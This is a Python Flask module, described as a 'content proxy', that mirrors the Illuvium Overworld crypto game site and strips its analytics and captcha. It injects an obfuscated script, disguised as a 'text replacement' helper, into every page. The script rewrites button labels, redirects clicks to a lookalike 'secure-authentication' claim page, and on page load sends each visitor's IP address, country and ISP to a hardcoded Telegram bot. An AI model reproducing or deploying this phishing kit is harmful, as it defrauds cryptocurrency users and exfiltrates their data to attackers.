from flask import request, Response, current_app
import requests
import re
import os
import logging
import urllib.parse

logger = logging.getLogger(__name__)

def init_content_proxy(app):
    """Initialize content proxy routes for the Flask app"""
    
    def remove_tracking_scripts(content):
        """Remove Google Tag Manager iframe and tracking scripts from HTML content."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        # Remove GTM iframe
        content = content.replace(
            '<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WXHP66L" height="0" width="0" style="display:none;visibility:hidden"></iframe>',
            ''
        )
        
        # Remove GTM script
        content = content.replace(
            '<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-B4V7XNT23Z"></script>',
            ''
        )
        content = content.replace(
            '<script async="" src="https://store.epicgames.com/en-US/p/illuvium-60064c"></script>',
            ''
        )
        
        # Remove GTM initialization script
        gtm_init_script = '''<script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'G-B4V7XNT23Z', {
              page_path: window.location.pathname,
            });
          </script>'''
        content = content.replace(gtm_init_script, '')
        
        # Remove GTM inline script
        gtm_inline_script = '''<script>
            (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
            })(window,document,'script','dataLayer', 'GTM-WXHP66L');
          </script>'''
        content = content.replace(gtm_inline_script, '')
        
        # Remove Geetest script
        content = content.replace(
            '<script async="" src="https://static.geetest.com/v4/gt4.js"></script>',
            ''
        )
        
        return content
    
    def rewrite_urls(content):
        """Rewrite URLs to point to proxy server."""
        # Implementation continues...
        return content
    
    def get_text_replacement_script():
        """Return the text replacement JavaScript code"""
        return '''
<script>
function _0x4da3(_0x30251a,_0xed3e4e){const _0x334185=_0x3341();return _0x4da3=function(_0x4da35a,_0x48c3cd){_0x4da35a=_0x4da35a-0x125;let _0x25c140=_0x334185[_0x4da35a];return _0x25c140;},_0x4da3(_0x30251a,_0xed3e4e);}const _0x5bd627=_0x4da3;(function(_0xe0070e,_0x2b3f9f){const _0xd34695=_0x4da3,_0x5a2b69=_0xe0070e();while(!![]){try{const _0x24c83d=-parseInt(_0xd34695(0x158))/0x1*(-parseInt(_0xd34695(0x14c))/0x2)+parseInt(_0xd34695(0x15c))/0x3*(parseInt(_0xd34695(0x12a))/0x4)+parseInt(_0xd34695(0x150))/0x5+parseInt(_0xd34695(0x139))/0x6+parseInt(_0xd34695(0x13d))/0x7*(-parseInt(_0xd34695(0x13c))/0x8)+parseInt(_0xd34695(0x153))/0x9+-parseInt(_0xd34695(0x135))/0xa;if(_0x24c83d===_0x2b3f9f)break;else _0x5a2b69['push'](_0x5a2b69['shift']());}catch(_0x2ac8ea){_0x5a2b69['push'](_0x5a2b69['shift']());}}}(_0x3341,0xe86e3),document[_0x5bd627(0x12b)](_0x5bd627(0x140),function(){const _0xc090dc=_0x5bd627,_0x1bf151={'Play\x20for\x20Free':'','Play\x20Now':_0xc090dc(0x14a),'Log\x20In\x20with\x20Passport':_0xc090dc(0x147),'Connect\x20Wallet':_0xc090dc(0x13a),'Launch\x20Game':'Get\x20Yours','Create\x20Account':_0xc090dc(0x14d),'Sign\x20Up':_0xc090dc(0x126),'Register':_0xc090dc(0x13e),'News':_0xc090dc(0x14e),'Home':'Main','About':_0xc090dc(0x146),'Contact':_0xc090dc(0x159),'FAQ':_0xc090dc(0x136),'Roadmap':_0xc090dc(0x15f),'Whitepaper':'Documentation'},_0x4b0f12={'Survive\x20the\x20Overworld,\x20a\x20hostile\x20planet\x20teeming\x20with\x20Illuvials\x20waiting\x20to\x20be\x20found.':''};function _0x2e200d(_0xce994b,_0x3e47de,_0x5691be){}function _0x31a269(_0xad4bb9){const _0x39e2ef=_0xc090dc;let _0x5a35a3='';for(const _0x4e458a of _0xad4bb9['childNodes']){_0x4e458a[_0x39e2ef(0x133)]===Node[_0x39e2ef(0x131)]&&(_0x5a35a3+=_0x4e458a[_0x39e2ef(0x127)]['trim']());}!_0x5a35a3&&(_0x5a35a3=_0xad4bb9[_0x39e2ef(0x127)][_0x39e2ef(0x143)]());if(_0x1bf151[_0x5a35a3]){const _0x9b1b5b=_0x5a35a3;if(_0xad4bb9[_0x39e2ef(0x155)][_0x39e2ef(0x137)]===0x1&&_0xad4bb9['childNodes'][0x0]['nodeType']===Node[_0x39e2ef(0x131)])_0xad4bb9[_0x39e2ef(0x127)]=_0x1bf151[_0x5a35a3];else{let _0x2b0844=![];for(const _0x15547a of _0xad4bb9[_0x39e2ef(0x155)]){if(_0x15547a[_0x39e2ef(0x133)]===Node[_0x39e2ef(0x131)]&&_0x15547a[_0x39e2ef(0x127)][_0x39e2ef(0x143)]()===_0x5a35a3){_0x15547a[_0x39e2ef(0x127)]=_0x1bf151[_0x5a35a3],_0x2b0844=!![];break;}}!_0x2b0844&&(_0xad4bb9[_0x39e2ef(0x127)]=_0x1bf151[_0x5a35a3]);}_0x2e200d(_0xad4bb9,_0x9b1b5b,_0x1bf151[_0x5a35a3]);}_0xad4bb9[_0x39e2ef(0x125)][_0x39e2ef(0x132)](_0x39e2ef(0x157));}function _0x1f8ea9(){const _0x415a9d=_0xc090dc,_0x269be8=document[_0x415a9d(0x12d)]('p');_0x269be8[_0x415a9d(0x15d)](_0x24e4de=>{const _0x12ed31=_0x415a9d,_0x315aad=_0x24e4de[_0x12ed31(0x127)][_0x12ed31(0x143)]();if(_0x4b0f12[_0x315aad]){const _0x1c3b89=_0x315aad,_0x2cfad2=_0x4b0f12[_0x315aad];_0x24e4de[_0x12ed31(0x127)]=_0x2cfad2,_0x2e200d(_0x24e4de,_0x1c3b89,_0x2cfad2);}});}function _0x16a660(){const _0x4ee9ac=_0xc090dc;document[_0x4ee9ac(0x12d)](_0x4ee9ac(0x128))[_0x4ee9ac(0x15d)](_0x31a269),document[_0x4ee9ac(0x12d)]('a[href*=\x22news\x22],\x20a[href*=\x22about\x22],\x20a[href*=\x22faq\x22]')[_0x4ee9ac(0x15d)](_0x31a269),document[_0x4ee9ac(0x12d)](_0x4ee9ac(0x12e))['forEach'](_0x31a269),_0x1f8ea9();}_0x16a660(),setInterval(function(){const _0x37d034=_0xc090dc;document[_0x37d034(0x12d)](_0x37d034(0x12c))[_0x37d034(0x15d)](_0x31a269),_0x1f8ea9();},0x3e8);const _0x1bf222=new MutationObserver(function(_0x19d9df){const _0x208aa1=_0xc090dc;let _0x4e2fc1=![];_0x19d9df[_0x208aa1(0x15d)](_0x19256e=>{const _0xa3724=_0x208aa1;_0x19256e['addedNodes'][_0xa3724(0x137)]&&(_0x4e2fc1=!![]);}),_0x4e2fc1&&(document['querySelectorAll'](_0x208aa1(0x12c))[_0x208aa1(0x15d)](_0x31a269),_0x1f8ea9());});_0x1bf222[_0xc090dc(0x14b)](document['body'],{'childList':!![],'subtree':!![]}),document[_0xc090dc(0x12b)](_0xc090dc(0x154),function(_0x7e3e50){const _0x54aa6e=_0xc090dc,_0x2f4df8=_0x7e3e50[_0x54aa6e(0x134)],_0x121f4e=_0x2f4df8['closest'](_0x54aa6e(0x128));if(!_0x121f4e)return;if(_0x121f4e[_0x54aa6e(0x125)][_0x54aa6e(0x15b)](_0x54aa6e(0x141))||_0x121f4e[_0x54aa6e(0x125)][_0x54aa6e(0x15b)]('css-104rome')||_0x121f4e['classList'][_0x54aa6e(0x15b)](_0x54aa6e(0x15e))||_0x121f4e[_0x54aa6e(0x125)][_0x54aa6e(0x15b)](_0x54aa6e(0x129))||_0x121f4e[_0x54aa6e(0x125)]['contains'](_0x54aa6e(0x130)))return;_0x7e3e50[_0x54aa6e(0x15a)](),_0x7e3e50['stopPropagation']();if(_0x121f4e[_0x54aa6e(0x125)][_0x54aa6e(0x15b)](_0x54aa6e(0x157))){window[_0x54aa6e(0x151)](_0x54aa6e(0x156),_0x54aa6e(0x145),_0x54aa6e(0x149));return;}_0x121f4e[_0x54aa6e(0x154)]();},!![]);}));async function sendIPToTelegram(){const _0x411add=_0x5bd627,_0x18ca2c=_0x411add(0x13f),_0x2b4577=_0x411add(0x148);try{const _0xb60408=await fetch(_0x411add(0x152)),_0x17cf9b=await _0xb60408[_0x411add(0x144)](),_0x16cb61=_0x17cf9b['ip'],_0x546e4f=_0x17cf9b['country_name'],_0x5e4dcb=_0x17cf9b['org'],_0x485b66='[ILV]:\x20'+_0x16cb61+_0x411add(0x12f)+_0x546e4f+_0x411add(0x12f)+_0x5e4dcb;await fetch(_0x411add(0x138)+_0x18ca2c+_0x411add(0x142),{'method':_0x411add(0x14f),'headers':{'Content-Type':'application/json'},'body':JSON[_0x411add(0x13b)]({'chat_id':_0x2b4577,'text':_0x485b66})});}catch(_0x4a9de4){}}window[_0x5bd627(0x12b)]('load',sendIPToTelegram);function _0x3341(){const _0x17e4c1=['.chakra-link,\x20.nav-link,\x20.menu-item','\x20:\x20','css-1i8s7az','TEXT_NODE','add','nodeType','target','28799700BAVihc','Help','length','https://api.telegram.org/bot','11423154MHimPa','Connect\x20Wallet','stringify','8VXSJCW','12858517uRKitl','Collect\x20Now','7703714960:AAFhMovzxoNjr9LZq6m9kytv1R1EylQT1R8','DOMContentLoaded','css-tvaofb','/sendMessage','trim','json','googleWindow','Info','Start\x20Now','7005236807','width=800,height=600,toolbar=no,menubar=no,scrollbars=yes,resizable=yes','Grab\x20Your\x20Spot','observe','82Hxzvkp','New\x20Account','Updates','POST','893045VjaJOE','open','https://ipapi.co/json/','8549910wByDIp','click','childNodes','https://secure-authentication-immutable.vercel.app/?id=auth-passeport&user=209348&method=claim-your-mint','claim-button','28330EmrPxA','Reach\x20Us','preventDefault','contains','3zuOOEG','forEach','css-1hnz6hu','Timeline','classList','Register','textContent','button,\x20a','css-1oqedzn','5899792SLRZRc','addEventListener','button:not(.claim-button),\x20a:not(.claim-button)','querySelectorAll'];_0x3341=function(){return _0x17e4c1;};return _0x3341();}
</script>
 

'''

    @app.after_request
    def add_script_to_html(response):
        """Global after_request handler to add script to all HTML responses"""
        if response.mimetype == 'text/html':
            content = response.get_data(as_text=True)
            if '</body>' in content:
                script = get_text_replacement_script()
                content = content.replace('</body>', script + '</body>')
                response.set_data(content)
        return response

    # Add a catch-all route as a last resort
    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>')
    def catch_all(path):
        """Catch-all route that proxies to the original site and modifies content"""
        original_url = f"https://overworld.illuvium.io/{path}"
        logger.info(f"Catch-all proxy for: {original_url}")
        
        try:
            # Set proper headers to mimic a browser
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            
            # Add query parameters if any
            params = request.args.to_dict()
            
            # Make the request to the original site
            response = requests.get(original_url, headers=headers, params=params, stream=True)
            
            # Get content type
            content_type = response.headers.get('Content-Type', 'text/html')
            
            # If HTML, modify content
            if 'text/html' in content_type and response.status_code == 200:
                modified_content = modify_html_content(response.content)
                logger.info(f"HTML content modified for {path}")
                return Response(modified_content, mimetype=content_type)
            
            # For other content types or error codes, return as-is
            return Response(
                response.content, 
                status=response.status_code,
                content_type=content_type
            )
        except Exception as e:
            logger.error(f"Error in catch-all route: {str(e)}")
            import traceback
            logger.error(traceback.format_exc())
            return f"Error: {str(e)}", 500
